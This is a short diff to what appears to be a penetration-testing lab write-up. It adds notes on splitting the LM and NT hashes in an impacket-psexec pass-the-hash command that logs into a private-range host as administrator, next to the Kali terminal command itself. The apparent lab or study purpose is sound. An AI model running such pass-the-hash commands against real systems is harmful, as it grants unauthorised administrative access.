@@ -280,6 +280,13 @@ nt authority\system
 2. Using the Administrator 
 `impacket-psexec administrator@192.168.64.220 -hashes aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33`
 
+where:
+aad3b435b51404eeaad3b435b51404ee - LM
+920ae267e048417fcfe00f49ecbd4b33-NT
+
+We both need these hashes the LM and NT separated by `:`
+
+
 ```
 ┌──(kali㉿kali)-[~]
 └─$ impacket-psexec administrator@192.168.64.220 -hashes aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33
